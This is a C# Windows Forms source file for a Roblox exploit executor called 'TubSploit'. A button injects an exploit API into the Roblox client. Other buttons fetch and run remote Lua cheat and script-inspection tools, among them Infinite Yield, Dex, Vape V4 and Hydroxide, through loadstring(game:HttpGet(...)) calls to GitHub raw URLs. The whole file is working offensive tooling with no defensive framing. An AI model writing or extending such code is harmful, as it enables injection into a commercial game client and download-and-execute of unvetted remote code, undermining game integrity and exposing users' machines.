using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace cumCube
{
    public partial class Form1 : Form
    {
        Hovac_API.ExploitAPI exploitAPI = new Hovac_API.ExploitAPI();
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            exploitAPI.SendLuaScript(richTextBox1.Text); // Runs script
        }

        private void button2_Click(object sender, EventArgs e)
        {
            exploitAPI.LaunchExploit(); // Injects into Roblox
            exploitAPI.SendLuaScript(@"task.wait(); game:GetService(""StarterGui""):SetCore(""SendNotification"",{
	            Title = ""TubSploit"",
	            Text = ""Injected!"",
	            Icon = ""rbxassetid://13353741942""
            })"); // Runs script
            System.Media.SoundPlayer player = new System.Media.SoundPlayer(@"C:\VS\cumCube\cumCube\Poland.wav");
            player.Play();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            exploitAPI.SendLuaScript(@"loadstring(game:HttpGet(""https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua"", true))()"); // Runs script
        }

        private void button4_Click(object sender, EventArgs e)
        {
            exploitAPI.SendLuaScript(@"loadstring(game:HttpGet(""https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"", true))()"); // Runs script
        }

        private void button5_Click(object sender, EventArgs e)
        {
            exploitAPI.SendLuaScript(@"loadstring(game:HttpGet(""https://raw.githubusercontent.com/Roblox-Thot/Dex/main/out/build.lua""))()"); // Runs script
        }

        private void button6_Click(object sender, EventArgs e)
        {
            exploitAPI.SendLuaScript(@"local owner = ""Upbolt""
                local branch = ""revision""

                local function webImport(file)
                    return loadstring(game:HttpGetAsync((""https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua""):format(owner, branch, file)), file .. '.lua')()
                end

                webImport(""init"")
                webImport(""ui/main"")");
        }
    }
}
